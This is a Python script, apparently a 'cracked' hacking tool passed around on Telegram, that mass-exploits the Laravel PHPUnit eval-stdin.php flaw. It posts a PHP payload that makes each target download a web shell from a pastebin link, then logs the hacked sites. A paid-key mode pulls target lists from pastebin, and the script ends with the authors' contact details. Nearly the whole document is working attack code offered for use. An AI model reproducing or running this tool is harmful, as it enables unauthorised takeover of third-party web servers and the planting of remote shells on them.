# Cracked by Kovacs07 (t.me/sentinelblack)
import os, requests, sys, time, random, urllib
from colorama import *
from urllib2 import urlopen

def connect(host='http://google.com'):
    try:
        urllib.urlopen(host)
        return True
    except:
        return False


def stana():
    for i in msg:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)


def rce(lista):
    for l in lista:
        try:
            if 'http' not in str(l):
                l = 'http://' + l
            print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[97m Exploiting : ' + l
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}
            post = '<?php system("wget https://pastebin.com/raw/aJVq0T88 -O up.php");?>'
            vulnurl = str(l) + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            shell = str(l) + '/vendor/phpunit/phpunit/src/Util/PHP/up.php'
            session = requests.session()
            session.get(vulnurl, data=post, headers=headers, timeout=10)
            Checkshell = requests.get(shell, headers=headers, timeout=10)
            if 'GIF89a' in str(Checkshell.content):
                print '\x1b[91m[\x1b[92m=\x1b[91m]\x1b[92m Success ==> ' + l + '/vendor/phpunit/phpunit/src/Util/PHP/up.php'
                open('Result.txt', 'a').write(l + '/vendor/phpunit/phpunit/src/Util/PHP/up.php\n')
            else:
                print '\x1b[91m[-] Fail Uplaod !'
        except:
            print '\x1b[91m[-] ' + l + ' 403 Forbidden Error !'


def logo():
    print "\x1b[1;34;m\n       _                               _ ______      \n      | |                             | |  ____|     \n      | |     __ _ _ __ __ ___   _____| | |__  __  __ \n      | |    / _` | '__/ _` \\ \\ / / _ \\ |  __| \\ \\/ / Cracked by Kovacs\n      | |___| (_| | | | (_| |\\ V /  __/ | |____ >  <  Telegram : @Kovacs07\n      |______\\__,_|_|  \\__,_| \\_/ \\___|_|______/_/\\_\\\n              Mass Laravel framework phpunit RCE"


logo()
if connect():
    print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Connection : ok !'
else:
    print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[1m No Connection !'
    while not connect():
        print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[1m Check it Please !'
        time.sleep(1)
        print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[1m Reconnect ...'

print '\x1b[91m[\x1b[92m1\x1b[91m]\x1b[92m Beast Mode (Premium Users)\n\x1b[91m[\x1b[92m2\x1b[91m]\x1b[92m From txt file\n\x1b[91m[\x1b[92m3\x1b[91m]\x1b[92m About The Coder'
young = int(raw_input('\x1b[91m[\x1b[92m*\x1b[91m]\x1b[92m Select > '))
while not 0 < young or not young < 4:
    print '\x1b[91m/!\\ Open Your Eyes In options/!\\ '
    young = int(raw_input('\x1b[91m[\x1b[92m*\x1b[91m]\x1b[92m Select > '))

if young == 1:
    yassine = raw_input('\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Your key > ')
    msg = '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Check key ....\n'
    stana()
    if str(yassine) == 'Jenderal92':
        msg = '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Key Accepted ...\n\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Grabbing sites ...\n'
        stana()
        urlx = random.choice(['https://pastebin.com/raw/e2k2Ab2T', 'https://pastebin.com/raw/mx9CaFQ2', 'https://pastebin.com/raw/c7KKMr0k', 'https://pastebin.com/raw/7trXWSAL', 'https://pastebin.com/raw/Y8M9hW1c', 'https://pastebin.com/raw/26wEJChf', 'https://pastebin.com/raw/GZLMunt9', 'https://pastebin.com/raw/cgTvzyEG', 'https://pastebin.com/raw/VWPKqJvz', 'https://pastebin.com/raw/z0QYNu9J'])
        r = requests.get(urlx)
        i = 0
        for line in r.text.splitlines():
            site = line.split('\n')[0]
            i = i + 1
            open('Grabbed.txt', 'a+').write(site + '\n')

        file = open('Grabbed.txt', 'r').read().splitlines()
        print ('\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Number of sites {}.\n').format(i)
        msg = '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Grabbed With Success :)\n\x1b[91m[\x1b[92m+\x1b[91m]\x1b[96m Exploiting Started ....\n'
        stana()
        rce(file)
    else:
        print '\x1b[91m[-] Invalid Key !\nContact me to get your own key :  \nICQ : 748166881\nTelegram : @youngxhood\n'
        sys.exit(0)
elif young == 2:
    file = open(raw_input('\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92m Your List >'), 'r').read().splitlines()
    msg = '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[96m Exploiting Started ....\n'
    stana()
    rce(file)
elif young == 3:
    print '\n[+] Young Hood :\nICQ : 748166881\nTelegram : @youngxhood\nEmail : youngxhood@gmail.com\n'
